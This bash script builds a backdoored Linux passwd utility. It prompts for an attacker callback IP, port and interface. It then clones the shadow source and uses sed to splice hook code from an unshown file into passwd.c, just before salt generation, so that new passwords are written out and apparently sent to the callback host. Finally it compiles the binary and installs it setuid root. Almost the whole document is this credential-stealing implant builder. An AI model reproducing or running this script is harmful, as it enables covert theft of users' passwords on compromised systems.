#!/bin/bash

## Check if Root ##
if [ "$EUID" -ne 0 ]; then 
  echo "Must run as superuser"
  exit
fi

## Get Variables ##
echo -n "Enter the IP Address to Callback to : "
read ip
echo -n "Set the destination port : "
read port
echo -n "Enter Interface name : "
read interface
echo -ne "IP : ${ip}\n Port : ${port}\n Interface : ${interface}\nConfirm these settings [y/n] : "
read pass
if [[ $pass == n ]]; then
    exit 0
fi

## Get dependancies and autogen ##
sudo apt install -y git make 
sudo apt install -y autoconf autopoint libtool xsltproc libselinux1-dev libsemanage1-dev bison byacc python3-pip
sudo pip3 install python-dotenv
sudo apt-get build-dep -y shadow
touch .env
git clone https://github.com/shadow-maint/shadow
cd shadow
./autogen.sh

## Add Inject Code ##

cd ../
# Assign Code to Paste
imports=$(head -n 7 hook_code.txt)
def_var="#define IP \"${ip}\""
def_port="#define PORT ${port}"
code=$(tail -n +13 hook_code.txt)

# Fix Newline Char
imports=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$imports")
def_var=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$def_var")
def_port=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$def_port")
code=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$code")

## Modify Code ##
cd shadow
# Inject Hook
sed -i "/salt = crypt_make_salt (NULL, NULL);/i \        writetofile(pass);" src/passwd.c

# Add Imports
sed -i '/#include \"shadowio.h\"/a '"$imports"'' src/passwd.c

# Add Variables
sed -i '/#include <string.h>/a '"$def_var"'\n'"$def_port"'' src/passwd.c
sed -i 's/#INT/'"$interface"'/g' src/passwd.c

# Add Hook Function
sed -i '/static int new_password (const struct passwd \*pw)/i '"$code"'' src/passwd.c
sed -i 's/\", name, password);/ /g' src/passwd.c
sed -i 's/fprintf(fptr, \"%s:%s/fprintf(fptr, \"%s:%s\\n\", name, password);/g' src/passwd.c


## Make ##
sudo make all
sudo chmod 4755 src/passwd 